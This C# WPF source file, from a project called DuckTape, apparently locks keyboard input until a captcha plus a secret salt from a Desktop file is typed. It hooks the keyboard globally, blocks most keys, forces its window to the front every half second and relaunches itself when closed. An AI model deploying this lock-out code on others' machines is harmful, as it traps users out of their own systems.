using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;


namespace DuckTape.MVVM.View
{
    public partial class Window2 : Window
    {
        private readonly Random random = new Random();
        private string captcha;
        private ObservableCollection<string> logEntries;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private readonly LowLevelKeyboardProc _proc;
        private readonly IntPtr _hookId = IntPtr.Zero;

        public bool? IsChecked { get; set; }
        private Mutex mutex;

        public Window2()
        {
            InitializeComponent();
            // Create a new mutex with a unique name
            mutex = new Mutex(true, "Yume", out bool isNewInstance);

            if (!isNewInstance)
            {
                // If another instance is already running, close this instance
                Close();
            }
            else
            {
                Loaded += Window2_Loaded;

                logEntries = new ObservableCollection<string>();
                logListBox.ItemsSource = logEntries;
                // Set up low-level keyboard hook
                _proc = HookCallback;
                using (var process = System.Diagnostics.Process.GetCurrentProcess())
                using (var module = process.MainModule)
                {
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(module.ModuleName), 0);
                }
            }

        }
        private void Window2_Loaded(object sender, RoutedEventArgs e)
        {
            if (IsChecked.HasValue && IsChecked.Value)
            {
            }
        }
      
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                var vkCode = Marshal.ReadInt32(lParam);

                if (vkCode == 0x0D && !(IsChecked.HasValue && IsChecked.Value))
                {
                    // Enter key is pressed and checkbox is not checked,
                    // allow the key press without hooking
                    return CallNextHookEx(_hookId, nCode, wParam, lParam);
                }

                if (!IsKeyAllowed(vkCode))
                {
                    return (IntPtr)1; // Block the key press
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }



        private bool IsKeyAllowed(int vkCode)
        {
            var key = KeyInterop.KeyFromVirtualKey(vkCode);
            if (key == Key.Back || key == Key.PrintScreen)
            {
                return true;
            }
            return (key >= Key.A && key <= Key.Z) ||
                   (key >= Key.D0 && key <= Key.D9) ||
                   (key >= Key.NumPad0 && key <= Key.NumPad9) ||
                   key == Key.LeftShift || key == Key.RightShift ||
                   key == Key.OemPeriod || key == Key.OemComma || key == Key.OemMinus;
        }


        protected override void OnClosed(EventArgs e)
        {
            mutex.ReleaseMutex(); // Release the mutex
            // Unhook the low-level keyboard hook when the window is closed
            UnhookWindowsHookEx(_hookId);
            base.OnClosed(e);
            Process.Start(Application.ResourceAssembly.Location);
            Application.Current.Shutdown();
        }

        // P/Invoke declarations
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        private async void button1_Click(object sender, RoutedEventArgs e)
        {
            if (textBox1.Text.Equals(captcha, StringComparison.InvariantCultureIgnoreCase))
            {
                // Captcha is correct, close the window
                this.Close();
            }
            else
            {
                logEntries.Add(textBox1.Text);
                // Clear the TextBox
                textBox1.Text = string.Empty;

                // Store the original position of the label
                double originalLeft = label1.Margin.Left;

                // Flash the label between green and blue colors while jiggling side to side
                for (int i = 0; i < 5; i++)
                {
                    // Move the label to the right
                    label1.Margin = new Thickness(originalLeft + 10, label1.Margin.Top, 0, 0);

                    // Set the label color to green
                    label1.Foreground = Brushes.Green;
                    await Task.Delay(100); // Wait for 100 milliseconds

                    // Move the label back to the original position
                    label1.Margin = new Thickness(originalLeft, label1.Margin.Top, 0, 0);

                    // Set the label color to blue
                    label1.Foreground = Brushes.Blue;
                    await Task.Delay(100); // Wait for 100 milliseconds
                }

                // Set the final color to red
                label1.Foreground = Brushes.Red;
                // Generate a new captcha

                GenerateCaptcha();
            }
        }




        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Generate a new captcha on window load
            GenerateCaptcha();
            textBox1.Focus();


            foregroundTimer = new System.Timers.Timer(500); // Set the interval to 500ms (0.5 second)
            foregroundTimer.Elapsed += ForegroundTimer_Elapsed;
            foregroundTimer.Start();
        }
        private void ForegroundTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
            // Invoke the Dispatcher to set the window as the foreground window
            Dispatcher.Invoke(() =>
            {
                SetForegroundWindow(new System.Windows.Interop.WindowInteropHelper(this).Handle);
            });
        }

        private System.Timers.Timer foregroundTimer;

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);


        private void saveButton_Click(object sender, RoutedEventArgs e)
        {
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string fileName = $"Log_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
            string filePath = Path.Combine(desktopPath, fileName);

            File.WriteAllLines(filePath, logEntries);

            MessageBox.Show($"Log saved to: {filePath}");
        }


        private void GenerateCaptcha()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            if (App.CaptchaLength == 0)
            {
                App.CaptchaLength = 3;
            }

            // Read the salt from the text document
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string saltFilePath = Path.Combine(desktopPath, "s.txt");
            string salt;

            if (File.Exists(saltFilePath))
            {
                salt = File.ReadAllText(saltFilePath).Trim();
            }
            else
            {
                salt = "hi";
                File.WriteAllText(saltFilePath, salt);
            }

            string captchaWithoutSalt = "";
            for (int i = 0; i < App.CaptchaLength; i++)
            {
                captchaWithoutSalt += chars[random.Next(chars.Length)];
            }

            // Store the captcha with the salt for verification
            captcha = captchaWithoutSalt + salt;

            label1.Content = captchaWithoutSalt;
           
        }



        private void Button_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }
    }
}
